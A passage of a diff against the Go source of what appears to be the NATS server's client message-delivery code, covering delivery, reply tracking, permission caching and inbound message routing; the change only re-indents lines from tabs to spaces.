in a stalled state, go ahead and wait here\n-\t// with a limit.\n-\tif c.kind == CLIENT && client.out.stc != nil {\n-\t\tclient.stalledWait(c)\n-\t}\n-\n-\t// Check for closed connection\n-\tif client.isClosed() {\n-\t\tclient.mu.Unlock()\n-\t\treturn false\n-\t}\n-\n-\t// Do a fast check here to see if we should be tracking this from a latency\n-\t// perspective. This will be for a request being received for an exported service.\n-\t// This needs to be from a non-client (otherwise tracking happens at requestor).\n-\t//\n-\t// Also this check captures if the original reply (c.pa.reply) is a GW routed\n-\t// reply (since it is known to be > minReplyLen). If that is the case, we need to\n-\t// track the binding between the routed reply and the reply set in the message\n-\t// header (which is c.pa.reply without the GNR routing prefix).\n-\tif client.kind == CLIENT && len(c.pa.reply) > minReplyLen {\n-\t\tif gwrply {\n-\t\t\t// Note that we keep track of the GW routed reply in the destination\n-\t\t\t// connection (`client`). The routed reply subject is in `c.pa.reply`,\n-\t\t\t// should that change, we would have to pass the GW routed reply as\n-\t\t\t// a parameter of deliverMsg().\n-\t\t\tsrv.trackGWReply(client, nil, reply, c.pa.reply)\n-\t\t}\n-\n-\t\t// If we do not have a registered RTT queue that up now.\n-\t\tif client.rtt == 0 {\n-\t\t\tclient.sendRTTPingLocked()\n-\t\t}\n-\t\t// FIXME(dlc) - We may need to optimize this.\n-\t\t// We will have tagged this with a suffix ('.T') if we are tracking. This is\n-\t\t// needed from sampling. Not all will be tracked.\n-\t\tif c.kind != CLIENT && isTrackedReply(c.pa.reply) {\n-\t\t\tclient.trackRemoteReply(string(subject), string(c.pa.reply))\n-\t\t}\n-\t}\n-\n-\t// Queue to outbound buffer\n-\tclient.queueOutbound(mh)\n-\tclient.queueOutbound(msg)\n-\tif prodIsMQTT {\n-\t\t// Need to add CR_LF since MQTT producers don't send CR_LF\n-\t\tclient.queueOutbound([]byte(CR_LF))\n-\t}\n-\n-\tclient.out.pm++\n-\n-\t// If we are tracking dynamic publish permissions that track reply subjects,\n-\t// do that accounting here. We only look at client.replies which will be non-nil.\n-\tif client.replies != nil && len(reply) > 0 {\n-\t\tclient.replies[string(reply)] = &resp{time.Now(), 0}\n-\t\tif len(client.replies) > replyPermLimit {\n-\t\t\tclient.pruneReplyPerms()\n-\t\t}\n-\t}\n-\n-\t// Check outbound threshold and queue IO flush if needed.\n-\t// This is specifically looking at situations where we are getting behind and may want\n-\t// to intervene before this producer goes back to top of readloop. We are in the producer's\n-\t// readloop go routine at this point.\n-\t// FIXME(dlc) - We may call this alot, maybe suppress after first call?\n-\tif client.out.pm > 1 && client.out.pb > maxBufSize*2 {\n-\t\tclient.flushSignal()\n-\t}\n-\n-\t// Add the data size we are responsible for here. This will be processed when we\n-\t// return to the top of the readLoop.\n-\tc.addToPCD(client)\n-\n-\tif client.trace {\n-\t\tclient.traceOutOp(string(mh[:len(mh)-LEN_CR_LF]), nil)\n-\t}\n-\n-\tclient.mu.Unlock()\n-\n-\treturn true\n+        if sub.client == nil {\n+                return false\n+        }\n+        client := sub.client\n+        client.mu.Lock()\n+\n+        // Check echo\n+        if c == client && !client.echo {\n+                client.mu.Unlock()\n+                return false\n+        }\n+\n+        // Check if we have a subscribe deny clause. This will trigger us to check the subject\n+        // for a match against the denied subjects.\n+        if client.mperms != nil && client.checkDenySub(string(subject)) {\n+                client.mu.Unlock()\n+                return false\n+        }\n+\n+        // New race detector forces this now.\n+        if sub.isClosed() {\n+                client.mu.Unlock()\n+                return false\n+        }\n+\n+        // Check if we are a leafnode and have perms to check.\n+        if client.kind == LEAF && client.perms != nil {\n+                if !client.pubAllowedFullCheck(string(subject), true, true) {\n+                        client.mu.Unlock()\n+                        client.Debugf(\"Not permitted to deliver to %q\", subject)\n+                        return false\n+                }\n+        }\n+\n+        srv := client.srv\n+\n+        sub.nm++\n+\n+        // Check if we should auto-unsubscribe.\n+        if sub.max > 0 {\n+                if client.kind == ROUTER && sub.nm >= sub.max {\n+                        // The only router based messages that we will see here are remoteReplies.\n+                        // We handle these slightly differently.\n+                        defer client.removeReplySub(sub)\n+                } else {\n+                        // For routing..\n+                        shouldForward := client.kind == CLIENT || client.kind == SYSTEM && client.srv != nil\n+                        // If we are at the exact number, unsubscribe but\n+                        // still process the message in hand, otherwise\n+                        // unsubscribe and drop message on the floor.\n+                        if sub.nm == sub.max {\n+                                client.Debugf(\"Auto-unsubscribe limit of %d reached for sid '%s'\", sub.max, string(sub.sid))\n+                                // Due to defer, reverse the code order so that execution\n+                                // is consistent with other cases where we unsubscribe.\n+                                if shouldForward {\n+                                        defer srv.updateRemoteSubscription(client.acc, sub, -1)\n+                                }\n+                                defer client.unsubscribe(client.acc, sub, true, true)\n+                        } else if sub.nm > sub.max {\n+                                client.Debugf(\"Auto-unsubscribe limit [%d] exceeded\", sub.max)\n+                                client.mu.Unlock()\n+                                client.unsubscribe(client.acc, sub, true, true)\n+                                if shouldForward {\n+                                        srv.updateRemoteSubscription(client.acc, sub, -1)\n+                                }\n+                                return false\n+                        }\n+                }\n+        }\n+\n+        // Check here if we have a header with our message. If this client can not\n+        // support we need to strip the headers from the payload.\n+        // The actual header would have been processed correctly for us, so just\n+        // need to update payload.\n+        if c.pa.hdr > 0 && !sub.client.headers {\n+                msg = msg[c.pa.hdr:]\n+        }\n+\n+        // Update statistics\n+\n+        // The msg includes the CR_LF, so pull back out for accounting.\n+        msgSize := int64(len(msg))\n+        prodIsMQTT := c.isMqtt()\n+        // MQTT producers send messages without CR_LF, so don't remove it for them.\n+        if !prodIsMQTT {\n+                msgSize -= int64(LEN_CR_LF)\n+        }\n+\n+        // No atomic needed since accessed under client lock.\n+        // Monitor is reading those also under client's lock.\n+        client.outMsgs++\n+        client.outBytes += msgSize\n+\n+        // Check for internal subscriptions.\n+        if sub.icb != nil && !c.noIcb {\n+                if gwrply {\n+                        // We will store in the account, not the client since it will likely\n+                        // be a different client that will send the reply.\n+                        srv.trackGWReply(nil, client.acc, reply, c.pa.reply)\n+                }\n+                client.mu.Unlock()\n+\n+                // Internal account clients are for service imports and need the '\\r\\n'.\n+                if client.kind == ACCOUNT {\n+                        sub.icb(sub, c, acc, string(subject), string(reply), msg)\n+                } else {\n+                        sub.icb(sub, c, acc, string(subject), string(reply), msg[:msgSize])\n+                }\n+                return true\n+        }\n+\n+        // We don't count internal deliveries so we update server statistics here.\n+        atomic.AddInt64(&srv.outMsgs, 1)\n+        atomic.AddInt64(&srv.outBytes, msgSize)\n+\n+        // If we are a client and we detect that the consumer we are\n+        // sending to is in a stalled state, go ahead and wait here\n+        // with a limit.\n+        if c.kind == CLIENT && client.out.stc != nil {\n+                client.stalledWait(c)\n+        }\n+\n+        // Check for closed connection\n+        if client.isClosed() {\n+                client.mu.Unlock()\n+                return false\n+        }\n+\n+        // Do a fast check here to see if we should be tracking this from a latency\n+        // perspective. This will be for a request being received for an exported service.\n+        // This needs to be from a non-client (otherwise tracking happens at requestor).\n+        //\n+        // Also this check captures if the original reply (c.pa.reply) is a GW routed\n+        // reply (since it is known to be > minReplyLen). If that is the case, we need to\n+        // track the binding between the routed reply and the reply set in the message\n+        // header (which is c.pa.reply without the GNR routing prefix).\n+        if client.kind == CLIENT && len(c.pa.reply) > minReplyLen {\n+                if gwrply {\n+                        // Note that we keep track of the GW routed reply in the destination\n+                        // connection (`client`). The routed reply subject is in `c.pa.reply`,\n+                        // should that change, we would have to pass the GW routed reply as\n+                        // a parameter of deliverMsg().\n+                        srv.trackGWReply(client, nil, reply, c.pa.reply)\n+                }\n+\n+                // If we do not have a registered RTT queue that up now.\n+                if client.rtt == 0 {\n+                        client.sendRTTPingLocked()\n+                }\n+                // FIXME(dlc) - We may need to optimize this.\n+                // We will have tagged this with a suffix ('.T') if we are tracking. This is\n+                // needed from sampling. Not all will be tracked.\n+                if c.kind != CLIENT && isTrackedReply(c.pa.reply) {\n+                        client.trackRemoteReply(string(subject), string(c.pa.reply))\n+                }\n+        }\n+\n+        // Queue to outbound buffer\n+        client.queueOutbound(mh)\n+        client.queueOutbound(msg)\n+        if prodIsMQTT {\n+                // Need to add CR_LF since MQTT producers don't send CR_LF\n+                client.queueOutbound([]byte(CR_LF))\n+        }\n+\n+        client.out.pm++\n+\n+        // If we are tracking dynamic publish permissions that track reply subjects,\n+        // do that accounting here. We only look at client.replies which will be non-nil.\n+        if client.replies != nil && len(reply) > 0 {\n+                client.replies[string(reply)] = &resp{time.Now(), 0}\n+                if len(client.replies) > replyPermLimit {\n+                        client.pruneReplyPerms()\n+                }\n+        }\n+\n+        // Check outbound threshold and queue IO flush if needed.\n+        // This is specifically looking at situations where we are getting behind and may want\n+        // to intervene before this producer goes back to top of readloop. We are in the producer's\n+        // readloop go routine at this point.\n+        // FIXME(dlc) - We may call this alot, maybe suppress after first call?\n+        if client.out.pm > 1 && client.out.pb > maxBufSize*2 {\n+                client.flushSignal()\n+        }\n+\n+        // Add the data size we are responsible for here. This will be processed when we\n+        // return to the top of the readLoop.\n+        c.addToPCD(client)\n+\n+        if client.trace {\n+                client.traceOutOp(string(mh[:len(mh)-LEN_CR_LF]), nil)\n+        }\n+\n+        client.mu.Unlock()\n+\n+        return true\n }\n \n // Add the given sub's client to the list of clients that need flushing.\n@@ -3274,50 +3276,50 @@ func (c *client) deliverMsg(sub *subscription, acc *Account, subject, reply, mh,\n // however, `client` lock must be held on entry. This holds true even\n // if `client` is same than `c`.\n func (c *client) addToPCD(client *client) {\n-\tif _, ok := c.pcd[client]; !ok {\n-\t\tclient.out.fsp++\n-\t\tc.pcd[client] = needFlush\n-\t}\n+        if _, ok := c.pcd[client]; !ok {\n+                client.out.fsp++\n+                c.pcd[client] = needFlush\n+        }\n }\n \n // This will track a remote reply for an exported service that has requested\n // latency tracking.\n // Lock assumed to be held.\n func (c *client) trackRemoteReply(subject, reply string) {\n-\ta := c.acc\n-\tif a == nil {\n-\t\treturn\n-\t}\n-\n-\tvar lrt time.Duration\n-\tvar respThresh time.Duration\n-\n-\ta.mu.RLock()\n-\tse := a.getServiceExport(subject)\n-\tif se != nil {\n-\t\tlrt = a.lowestServiceExportResponseTime()\n-\t\trespThresh = se.respThresh\n-\t}\n-\ta.mu.RUnlock()\n-\n-\tif se == nil {\n-\t\treturn\n-\t}\n-\n-\tif c.rrTracking == nil {\n-\t\tc.rrTracking = &rrTracking{\n-\t\t\trmap: make(map[string]*remoteLatency),\n-\t\t\tptmr: time.AfterFunc(lrt, c.pruneRemoteTracking),\n-\t\t\tlrt:  lrt,\n-\t\t}\n-\t}\n-\trl := remoteLatency{\n-\t\tAccount:    a.Name,\n-\t\tReqId:      reply,\n-\t\trespThresh: respThresh,\n-\t}\n-\trl.M2.RequestStart = time.Now().UTC()\n-\tc.rrTracking.rmap[reply] = &rl\n+        a := c.acc\n+        if a == nil {\n+                return\n+        }\n+\n+        var lrt time.Duration\n+        var respThresh time.Duration\n+\n+        a.mu.RLock()\n+        se := a.getServiceExport(subject)\n+        if se != nil {\n+                lrt = a.lowestServiceExportResponseTime()\n+                respThresh = se.respThresh\n+        }\n+        a.mu.RUnlock()\n+\n+        if se == nil {\n+                return\n+        }\n+\n+        if c.rrTracking == nil {\n+                c.rrTracking = &rrTracking{\n+                        rmap: make(map[string]*remoteLatency),\n+                        ptmr: time.AfterFunc(lrt, c.pruneRemoteTracking),\n+                        lrt:  lrt,\n+                }\n+        }\n+        rl := remoteLatency{\n+                Account:    a.Name,\n+                ReqId:      reply,\n+                respThresh: respThresh,\n+        }\n+        rl.M2.RequestStart = time.Now().UTC()\n+        c.rrTracking.rmap[reply] = &rl\n }\n \n // pruneRemoteTracking will prune any remote tracking objects\n@@ -3325,47 +3327,47 @@ func (c *client) trackRemoteReply(subject, reply string) {\n // sending reponses etc.\n // Lock should be held upon entry.\n func (c *client) pruneRemoteTracking() {\n-\tc.mu.Lock()\n-\tif c.rrTracking == nil {\n-\t\tc.mu.Unlock()\n-\t\treturn\n-\t}\n-\tnow := time.Now()\n-\tfor subject, rl := range c.rrTracking.rmap {\n-\t\tif now.After(rl.M2.RequestStart.Add(rl.respThresh)) {\n-\t\t\tdelete(c.rrTracking.rmap, subject)\n-\t\t}\n-\t}\n-\tif len(c.rrTracking.rmap) > 0 {\n-\t\tt := c.rrTracking.ptmr\n-\t\tt.Stop()\n-\t\tt.Reset(c.rrTracking.lrt)\n-\t} else {\n-\t\tc.rrTracking.ptmr.Stop()\n-\t\tc.rrTracking = nil\n-\t}\n-\tc.mu.Unlock()\n+        c.mu.Lock()\n+        if c.rrTracking == nil {\n+                c.mu.Unlock()\n+                return\n+        }\n+        now := time.Now()\n+        for subject, rl := range c.rrTracking.rmap {\n+                if now.After(rl.M2.RequestStart.Add(rl.respThresh)) {\n+                        delete(c.rrTracking.rmap, subject)\n+                }\n+        }\n+        if len(c.rrTracking.rmap) > 0 {\n+                t := c.rrTracking.ptmr\n+                t.Stop()\n+                t.Reset(c.rrTracking.lrt)\n+        } else {\n+                c.rrTracking.ptmr.Stop()\n+                c.rrTracking = nil\n+        }\n+        c.mu.Unlock()\n }\n \n // pruneReplyPerms will remove any stale or expired entries\n // in our reply cache. We make sure to not check too often.\n func (c *client) pruneReplyPerms() {\n-\t// Make sure we do not check too often.\n-\tif c.perms.resp == nil {\n-\t\treturn\n-\t}\n+        // Make sure we do not check too often.\n+        if c.perms.resp == nil {\n+                return\n+        }\n \n-\tmm := c.perms.resp.MaxMsgs\n-\tttl := c.perms.resp.Expires\n-\tnow := time.Now()\n+        mm := c.perms.resp.MaxMsgs\n+        ttl := c.perms.resp.Expires\n+        now := time.Now()\n \n-\tfor k, resp := range c.replies {\n-\t\tif mm > 0 && resp.n >= mm {\n-\t\t\tdelete(c.replies, k)\n-\t\t} else if ttl > 0 && now.Sub(resp.t) > ttl {\n-\t\t\tdelete(c.replies, k)\n-\t\t}\n-\t}\n+        for k, resp := range c.replies {\n+                if mm > 0 && resp.n >= mm {\n+                        delete(c.replies, k)\n+                } else if ttl > 0 && now.Sub(resp.t) > ttl {\n+                        delete(c.replies, k)\n+                }\n+        }\n }\n \n // pruneDenyCache will prune the deny cache via randomly\n@@ -3373,385 +3375,385 @@ func (c *client) pruneReplyPerms() {\n // Lock must be held for this one since it is shared under\n // deliverMsg.\n func (c *client) pruneDenyCache() {\n-\tr := 0\n-\tfor subject := range c.mperms.dcache {\n-\t\tdelete(c.mperms.dcache, subject)\n-\t\tif r++; r > pruneSize {\n-\t\t\tbreak\n-\t\t}\n-\t}\n+        r := 0\n+        for subject := range c.mperms.dcache {\n+                delete(c.mperms.dcache, subject)\n+                if r++; r > pruneSize {\n+                        break\n+                }\n+        }\n }\n \n // prunePubPermsCache will prune the cache via randomly\n // deleting items. Doing so pruneSize items at a time.\n func (c *client) prunePubPermsCache() {\n-\t// There is a case where we can invoke this from multiple go routines,\n-\t// (in deliverMsg() if sub.client is a LEAF), so we make sure to prune\n-\t// from only one go routine at a time.\n-\tif !atomic.CompareAndSwapInt32(&c.perms.prun, 0, 1) {\n-\t\treturn\n-\t}\n-\tconst maxPruneAtOnce = 1000\n-\tr := 0\n-\tc.perms.pcache.Range(func(k, _ interface{}) bool {\n-\t\tc.perms.pcache.Delete(k)\n-\t\tif r++; (r > pruneSize && atomic.LoadInt32(&c.perms.pcsz) < int32(maxPermCacheSize)) ||\n-\t\t\t(r > maxPruneAtOnce) {\n-\t\t\treturn false\n-\t\t}\n-\t\treturn true\n-\t})\n-\tatomic.AddInt32(&c.perms.pcsz, -int32(r))\n-\tatomic.StoreInt32(&c.perms.prun, 0)\n+        // There is a case where we can invoke this from multiple go routines,\n+        // (in deliverMsg() if sub.client is a LEAF), so we make sure to prune\n+        // from only one go routine at a time.\n+        if !atomic.CompareAndSwapInt32(&c.perms.prun, 0, 1) {\n+                return\n+        }\n+        const maxPruneAtOnce = 1000\n+        r := 0\n+        c.perms.pcache.Range(func(k, _ interface{}) bool {\n+                c.perms.pcache.Delete(k)\n+                if r++; (r > pruneSize && atomic.LoadInt32(&c.perms.pcsz) < int32(maxPermCacheSize)) ||\n+                        (r > maxPruneAtOnce) {\n+                        return false\n+                }\n+                return true\n+        })\n+        atomic.AddInt32(&c.perms.pcsz, -int32(r))\n+        atomic.StoreInt32(&c.perms.prun, 0)\n }\n \n // pubAllowed checks on publish permissioning.\n // Lock should not be held.\n func (c *client) pubAllowed(subject string) bool {\n-\treturn c.pubAllowedFullCheck(subject, true, false)\n+        return c.pubAllowedFullCheck(subject, true, false)\n }\n \n // pubAllowedFullCheck checks on all publish permissioning depending\n // on the flag for dynamic reply permissions.\n func (c *client) pubAllowedFullCheck(subject string, fullCheck, hasLock bool) bool {\n-\tif c.perms == nil || (c.perms.pub.allow == nil && c.perms.pub.deny == nil) {\n-\t\treturn true\n-\t}\n-\t// Check if published subject is allowed if we have permissions in place.\n-\tv, ok := c.perms.pcache.Load(subject)\n-\tif ok {\n-\t\treturn v.(bool)\n-\t}\n-\tallowed := true\n-\t// Cache miss, check allow then deny as needed.\n-\tif c.perms.pub.allow != nil {\n-\t\tr := c.perms.pub.allow.Match(subject)\n-\t\tallowed = len(r.psubs) != 0\n-\t}\n-\t// If we have a deny list and are currently allowed, check that as well.\n-\tif allowed && c.perms.pub.deny != nil {\n-\t\tr := c.perms.pub.deny.Match(subject)\n-\t\tallowed = len(r.psubs) == 0\n-\t}\n-\n-\t// If we are currently not allowed but we are tracking reply subjects\n-\t// dynamically, check to see if we are allowed here but avoid pcache.\n-\t// We need to acquire the lock though.\n-\tif !allowed && fullCheck && c.perms.resp != nil {\n-\t\tif !hasLock {\n-\t\t\tc.mu.Lock()\n-\t\t}\n-\t\tif resp := c.replies[subject]; resp != nil {\n-\t\t\tresp.n++\n-\t\t\t// Check if we have sent too many responses.\n-\t\t\tif c.perms.resp.MaxMsgs > 0 && resp.n > c.perms.resp.MaxMsgs {\n-\t\t\t\tdelete(c.replies, subject)\n-\t\t\t} else if c.perms.resp.Expires > 0 && time.Since(resp.t) > c.perms.resp.Expires {\n-\t\t\t\tdelete(c.replies, subject)\n-\t\t\t} else {\n-\t\t\t\tallowed = true\n-\t\t\t}\n-\t\t}\n-\t\tif !hasLock {\n-\t\t\tc.mu.Unlock()\n-\t\t}\n-\t} else {\n-\t\t// Update our cache here.\n-\t\tc.perms.pcache.Store(string(subject), allowed)\n-\t\tif n := atomic.AddInt32(&c.perms.pcsz, 1); n > maxPermCacheSize {\n-\t\t\tc.prunePubPermsCache()\n-\t\t}\n-\t}\n-\treturn allowed\n+        if c.perms == nil || (c.perms.pub.allow == nil && c.perms.pub.deny == nil) {\n+                return true\n+        }\n+        // Check if published subject is allowed if we have permissions in place.\n+        v, ok := c.perms.pcache.Load(subject)\n+        if ok {\n+                return v.(bool)\n+        }\n+        allowed := true\n+        // Cache miss, check allow then deny as needed.\n+        if c.perms.pub.allow != nil {\n+                r := c.perms.pub.allow.Match(subject)\n+                allowed = len(r.psubs) != 0\n+        }\n+        // If we have a deny list and are currently allowed, check that as well.\n+        if allowed && c.perms.pub.deny != nil {\n+                r := c.perms.pub.deny.Match(subject)\n+                allowed = len(r.psubs) == 0\n+        }\n+\n+        // If we are currently not allowed but we are tracking reply subjects\n+        // dynamically, check to see if we are allowed here but avoid pcache.\n+        // We need to acquire the lock though.\n+        if !allowed && fullCheck && c.perms.resp != nil {\n+                if !hasLock {\n+                        c.mu.Lock()\n+                }\n+                if resp := c.replies[subject]; resp != nil {\n+                        resp.n++\n+                        // Check if we have sent too many responses.\n+                        if c.perms.resp.MaxMsgs > 0 && resp.n > c.perms.resp.MaxMsgs {\n+                                delete(c.replies, subject)\n+                        } else if c.perms.resp.Expires > 0 && time.Since(resp.t) > c.perms.resp.Expires {\n+                                delete(c.replies, subject)\n+                        } else {\n+                                allowed = true\n+                        }\n+                }\n+                if !hasLock {\n+                        c.mu.Unlock()\n+                }\n+        } else {\n+                // Update our cache here.\n+                c.perms.pcache.Store(string(subject), allowed)\n+                if n := atomic.AddInt32(&c.perms.pcsz, 1); n > maxPermCacheSize {\n+                        c.prunePubPermsCache()\n+                }\n+        }\n+        return allowed\n }\n \n // Test whether a reply subject is a service import reply.\n func isServiceReply(reply []byte) bool {\n-\t// This function is inlined and checking this way is actually faster\n-\t// than byte-by-byte comparison.\n-\treturn len(reply) > 3 && string(reply[:4]) == replyPrefix\n+        // This function is inlined and checking this way is actually faster\n+        // than byte-by-byte comparison.\n+        return len(reply) > 3 && string(reply[:4]) == replyPrefix\n }\n \n // Test whether a reply subject is a service import or a gateway routed reply.\n func isReservedReply(reply []byte) bool {\n-\tif isServiceReply(reply) {\n-\t\treturn true\n-\t}\n-\t// Faster to check with string([:]) than byte-by-byte\n-\tif len(reply) > gwReplyPrefixLen && string(reply[:gwReplyPrefixLen]) == gwReplyPrefix {\n-\t\treturn true\n-\t}\n-\treturn false\n+        if isServiceReply(reply) {\n+                return true\n+        }\n+        // Faster to check with string([:]) than byte-by-byte\n+        if len(reply) > gwReplyPrefixLen && string(reply[:gwReplyPrefixLen]) == gwReplyPrefix {\n+                return true\n+        }\n+        return false\n }\n \n // This will decide to call the client code or router code.\n func (c *client) processInboundMsg(msg []byte) {\n-\tswitch c.kind {\n-\tcase CLIENT:\n-\t\tc.processInboundClientMsg(msg)\n-\tcase ROUTER:\n-\t\tc.processInboundRoutedMsg(msg)\n-\tcase GATEWAY:\n-\t\tc.processInboundGatewayMsg(msg)\n-\tcase LEAF:\n-\t\tc.processInboundLeafMsg(msg)\n-\t}\n+        switch c.kind {\n+        case CLIENT:\n+                c.processInboundClientMsg(msg)\n+        case ROUTER:\n+                c.processInboundRoutedMsg(msg)\n+        case GATEWAY:\n+                c.processInboundGatewayMsg(msg)\n+        case LEAF:\n+                c.processInboundLeafMsg(msg)\n+        }\n }\n \n // selectMappedSubject will chose the mapped subject based on the client's inbound subject.\n func (c *client) selectMappedSubject() bool {\n-\tnsubj, changed := c.acc.selectMappedSubject(string(c.pa.subject))\n-\tif changed {\n-\t\tc.pa.mapped = c.pa.subject\n-\t\tc.pa.subject = []byte(nsubj)\n-\t}\n-\treturn changed\n+        nsubj, changed := c.acc.selectMappedSubject(string(c.pa.subject))\n+        if changed {\n+                c.pa.mapped = c.pa.subject\n+                c.pa.subject = []byte(nsubj)\n+        }\n+        return changed\n }\n \n // processInboundClientMsg is called to process an inbound msg from a client.\n // Return if the message was delivered, and if the message was not delivered\n // due to a permission issue.\n func (c *client) processInboundClientMsg(msg []byte) (bool, bool) {\n-\t// Update statistics\n-\t// The msg includes the CR_LF, so pull back out for accounting.\n-\tc.in.msgs++\n-\tc.in.bytes += int32(len(msg) - LEN_CR_LF)\n-\n-\t// Check that client (could be here with SYSTEM) is not publishing on reserved \"$GNR\" prefix.\n-\tif c.kind == CLIENT && hasGWRoutedReplyPrefix(c.pa.subject) {\n-\t\tc.pubPermissionViolation(c.pa.subject)\n-\t\treturn false, true\n-\t}\n-\n-\t// Mostly under testing scenarios.\n-\tif c.srv == nil || c.acc == nil {\n-\t\treturn false, false\n-\t}\n-\n-\t// Check pub permissions\n-\tif c.perms != nil && (c.perms.pub.allow != nil || c.perms.pub.deny != nil) && !c.pubAllowed(string(c.pa.subject)) {\n-\t\tc.pubPermissionViolation(c.pa.subject)\n-\t\treturn false, true\n-\t}\n-\n-\t// Now check for reserved replies. These are used for service imports.\n-\tif c.kind == CLIENT && len(c.pa.reply) > 0 && isReservedReply(c.pa.reply) {\n-\t\tc.replySubjectViolation(c.pa.reply)\n-\t\treturn false, true\n-\t}\n-\n-\tif c.opts.Verbose {\n-\t\tc.sendOK()\n-\t}\n-\n-\t// If MQTT client, check for retain flag now that we have passed permissions check\n-\tif c.isMqtt() {\n-\t\tc.mqttHandlePubRetain()\n-\t}\n-\n-\t// Doing this inline as opposed to create a function (which otherwise has a measured\n-\t// performance impact reported in our bench)\n-\tvar isGWRouted bool\n-\tif c.kind != CLIENT {\n-\t\tif atomic.LoadInt32(&c.acc.gwReplyMapping.check) > 0 {\n-\t\t\tc.acc.mu.RLock()\n-\t\t\tc.pa.subject, isGWRouted = c.acc.gwReplyMapping.get(c.pa.subject)\n-\t\t\tc.acc.mu.RUnlock()\n-\t\t}\n-\t} else if atomic.LoadInt32(&c.gwReplyMapping.check) > 0 {\n-\t\tc.mu.Lock()\n-\t\tc.pa.subject, isGWRouted = c.gwReplyMapping.get(c.pa.subject)\n-\t\tc.mu.Unlock()\n-\t}\n-\n-\t// If we have an exported service and we are doing remote tracking, check this subject\n-\t// to see if we need to report the latency.\n-\tif c.rrTracking != nil {\n-\t\tc.mu.Lock()\n-\t\trl := c.rrTracking.rmap[string(c.pa.subject)]\n-\t\tif rl != nil {\n-\t\t\tdelete(c.rrTracking.rmap, string(c.pa.subject))\n-\t\t}\n-\t\tc.mu.Unlock()\n-\n-\t\tif rl != nil {\n-\t\t\tsl := &rl.M2\n-\t\t\t// Fill this in and send it off to the other side.\n-\t\t\tsl.Status = 200\n-\t\t\tsl.Responder = c.getClientInfo(true)\n-\t\t\tsl.ServiceLatency = time.Since(sl.RequestStart) - sl.Responder.RTT\n-\t\t\tsl.TotalLatency = sl.ServiceLatency + sl.Responder.RTT\n-\t\t\tsanitizeLatencyMetric(sl)\n-\t\t\tlsub := remoteLatencySubjectForResponse(c.pa.subject)\n-\t\t\tc.srv.sendInternalAccountMsg(nil, lsub, rl) // Send to SYS account\n-\t\t}\n-\t}\n-\n-\t// If the subject was converted to the gateway routed subject, then handle it now\n-\t// and be done with the rest of this function.\n-\tif isGWRouted {\n-\t\tc.handleGWReplyMap(msg)\n-\t\treturn true, false\n-\t}\n-\n-\t// Match the subscriptions. We will use our own L1 map if\n-\t// it's still valid, avoiding contention on the shared sublist.\n-\tvar r *SublistResult\n-\tvar ok bool\n-\n-\tgenid := atomic.LoadUint64(&c.acc.sl.genid)\n-\tif genid == c.in.genid && c.in.results != nil {\n-\t\tr, ok = c.in.results[string(c.pa.subject)]\n-\t} else {\n-\t\t// Reset our L1 completely.\n-\t\tc.in.results = make(map[string]*SublistResult)\n-\t\tc.in.genid = genid\n-\t}\n-\n-\t// Go back to the sublist data structure.\n-\tif !ok {\n-\t\tr = c.acc.sl.Match(string(c.pa.subject))\n-\t\tc.in.results[string(c.pa.subject)] = r\n-\t\t// Prune the results cache. Keeps us from unbounded growth. Random delete.\n-\t\tif len(c.in.results) > maxResultCacheSize {\n-\t\t\tn := 0\n-\t\t\tfor subject := range c.in.results {\n-\t\t\t\tdelete(c.in.results, subject)\n-\t\t\t\tif n++; n > pruneSize {\n-\t\t\t\t\tbreak\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// Indication if we attempted to deliver the message to anyone.\n-\tvar didDeliver bool\n-\tvar qnames [][]byte\n-\n-\t// Check for no interest, short circuit if so.\n-\t// This is the fanout scale.\n-\tif len(r.psubs)+len(r.qsubs) > 0 {\n-\t\tflag := pmrNoFlag\n-\t\t// If there are matching queue subs and we are in gateway mode,\n-\t\t// we need to keep track of the queue names the messages are\n-\t\t// delivered to. When sending to the GWs, the RMSG will include\n-\t\t// those names so that the remote clusters do not deliver messages\n-\t\t// to their queue subs of the same names.\n-\t\tif len(r.qsubs) > 0 && c.srv.gateway.enabled &&\n-\t\t\tatomic.LoadInt64(&c.srv.gateway.totalQSubs) > 0 {\n-\t\t\tflag |= pmrCollectQueueNames\n-\t\t}\n-\t\tdidDeliver, qnames = c.processMsgResults(c.acc, r, msg, c.pa.deliver, c.pa.subject, c.pa.reply, flag)\n-\t}\n-\n-\t// Now deal with gateways\n-\tif c.srv.gateway.enabled {\n-\t\treply := c.pa.reply\n-\t\tif len(c.pa.deliver) > 0 && c.kind == JETSTREAM && len(c.pa.reply) > 0 {\n-\t\t\treply = append(reply, '@')\n-\t\t\treply = append(reply, c.pa.deliver...)\n-\t\t}\n-\t\tdidDeliver = c.sendMsgToGateways(c.acc, msg, c.pa.subject, reply, qnames) || didDeliver\n-\t}\n-\n-\t// Check to see if we did not deliver to anyone and the client has a reply subject set\n-\t// and wants notification of no_responders.\n-\tif !didDeliver && len(c.pa.reply) > 0 {\n-\t\tc.mu.Lock()\n-\t\tif c.opts.NoResponders {\n-\t\t\tif sub := c.subForReply(c.pa.reply); sub != nil {\n-\t\t\t\tproto := fmt.Sprintf(\"HMSG %s %s 16 16\\r\\nNATS/1.0 503\\r\\n\\r\\n\\r\\n\", c.pa.reply, sub.sid)\n-\t\t\t\tc.queueOutbound([]byte(proto))\n-\t\t\t\tc.addToPCD(c)\n-\t\t\t}\n-\t\t}\n-\t\tc.mu.Unlock()\n-\t}\n-\n-\treturn didDeliver, false\n+        // Update statistics\n+        // The msg includes the CR_LF, so pull back out for accounting.\n+        c.in.msgs++\n+        c.in.bytes += int32(len(msg) - LEN_CR_LF)\n+\n+        // Check that client (could be here with SYSTEM) is not publishing on reserved \"$GNR\" prefix.\n+        if c.kind == CLIENT && hasGWRoutedReplyPrefix(c.pa.subject) {\n+                c.pubPermissionViolation(c.pa.subject)\n+                return false, true\n+        }\n+\n+        // Mostly under testing scenarios.\n+        if c.srv == nil || c.acc == nil {\n+                return false, false\n+        }\n+\n+        // Check pub permissions\n+        if c.perms != nil && (c.perms.pub.allow != nil || c.perms.pub.deny != nil) && !c.pubAllowed(string(c.pa.subject)) {\n+                c.pubPermissionViolation(c.pa.subject)\n+                return false, true\n+        }\n+\n+        // Now check for reserved replies. These are used for service imports.\n+        if c.kind == CLIENT && len(c.pa.reply) > 0 && isReservedReply(c.pa.reply) {\n+                c.replySubjectViolation(c.pa.reply)\n+                return false, true\n+        }\n+\n+        if c.opts.Verbose {\n+                c.sendOK()\n+        }\n+\n+        // If MQTT client, check for retain flag now that we have passed permissions check\n+        if c.isMqtt() {\n+                c.mqttHandlePubRetain()\n+        }\n+\n+        // Doing 